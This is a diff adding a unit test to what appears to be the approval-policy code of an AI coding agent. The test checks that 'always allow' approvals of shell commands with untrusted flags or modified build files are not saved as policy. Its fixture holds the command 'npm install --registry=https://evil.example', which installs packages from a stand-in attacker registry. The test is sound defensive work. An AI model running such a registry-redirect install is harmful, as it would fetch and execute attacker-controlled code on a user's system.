@@ -423,6 +423,57 @@ describe('policy.ts', () => {
       );
     });
 
+    it.each([
+      {
+        name: 'untrusted flags',
+        risk: { untrustedFlags: ['--registry=https://evil.example'] },
+      },
+      {
+        name: 'modified build files',
+        risk: { modifiedBuildFiles: ['package.json'] },
+      },
+    ])(
+      'should not publish a policy update for shell commands with $name',
+      async ({ risk }) => {
+        const mockConfig = {
+          getApprovalMode: vi.fn().mockReturnValue(ApprovalMode.DEFAULT),
+          setApprovalMode: vi.fn(),
+          isTrustedFolder: vi.fn().mockReturnValue(true),
+          getWorkspacePoliciesDir: vi.fn().mockReturnValue(undefined),
+        } as unknown as Mocked<Config>;
+        (mockConfig as unknown as { config: Config }).config =
+          mockConfig as Config;
+        const mockMessageBus = {
+          publish: vi.fn(),
+        } as unknown as Mocked<MessageBus>;
+        const tool = { name: 'run_shell_command' } as AnyDeclarativeTool;
+        const details: ToolExecuteConfirmationDetails = {
+          type: 'exec',
+          command: 'npm install --registry=https://evil.example',
+          rootCommand: 'npm',
+          rootCommands: ['npm'],
+          title: 'Shell',
+          onConfirm: vi.fn(),
+          ...risk,
+        };
+
+        for (const outcome of [
+          ToolConfirmationOutcome.ProceedAlways,
+          ToolConfirmationOutcome.ProceedAlwaysAndSave,
+        ]) {
+          await updatePolicy(
+            tool,
+            outcome,
+            details,
+            mockConfig,
+            mockMessageBus,
+          );
+        }
+
+        expect(mockMessageBus.publish).not.toHaveBeenCalled();
+      },
+    );
+
     it('should handle MCP policy updates (server scope)', async () => {
       const mockConfig = {
         getApprovalMode: vi.fn().mockReturnValue(ApprovalMode.DEFAULT),
